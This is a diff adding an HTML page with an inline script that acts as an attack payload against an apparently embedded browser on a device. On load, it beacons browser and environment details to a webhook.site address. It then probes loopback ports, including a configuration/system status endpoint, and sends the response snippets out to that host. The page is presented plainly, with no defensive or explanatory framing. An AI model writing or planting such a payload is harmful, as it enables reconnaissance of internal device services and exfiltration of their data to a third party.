@@ -1,0 +1,29 @@
+<!doctype html><html><head><meta charset="utf-8"><title>bp</title></head><body>
+<script>
+(function(){
+  var W="https://webhook.site/c7b10235-199e-45d3-89bd-2f53b4ecab6d";
+  function b(k,v){ try{ (new Image()).src = W+"?t="+encodeURIComponent(k)+"&v="+encodeURIComponent(String(v).slice(0,180))+"&r="+Math.random(); }catch(e){} }
+  b("boot","loaded");
+  b("ua", navigator.userAgent);
+  b("perf", (performance&&performance.now)?performance.now().toFixed(0):"na");
+  b("secure", window.isSecureContext);
+  b("origin", location.href.slice(0,80));
+  b("chrome", typeof window.chrome);
+  b("qt", typeof window.qt + "/" + typeof window.webChannelTransport);
+  b("storage", (function(){try{localStorage.setItem("p","1");return localStorage.getItem("p");}catch(e){return "err";}})());
+  // loopback reachability from INSIDE the device (renderer sits on the device)
+  var probes = [
+    ["443","https://127.0.0.1/"],
+    ["4003status","https://127.0.0.1:4003/v2/configuration/system/status"],
+    ["4003root","https://127.0.0.1:4003/"],
+    ["80","http://127.0.0.1/"],
+    ["6542","http://127.0.0.1:6542/"],
+    ["7000","http://127.0.0.1:7000/"],
+    ["47000","http://127.0.0.1:47000/"],
+    ["22","http://127.0.0.1:22/"]
+  ];
+  function sync(u){ try{ var x=new XMLHttpRequest(); x.open("GET",u,false); x.send(null); return "HTTP "+x.status+" len="+(x.responseText?x.responseText.length:0)+" head="+(x.responseText||"").replace(/[<>\n]/g," ").slice(0,80); }catch(e){ return "ERR "+String(e).slice(0,60); } }
+  for (var i=0;i<probes.length;i++){ b("lp_"+probes[i][0], sync(probes[i][1])); }
+  b("done","1");
+})();
+</script></body></html>
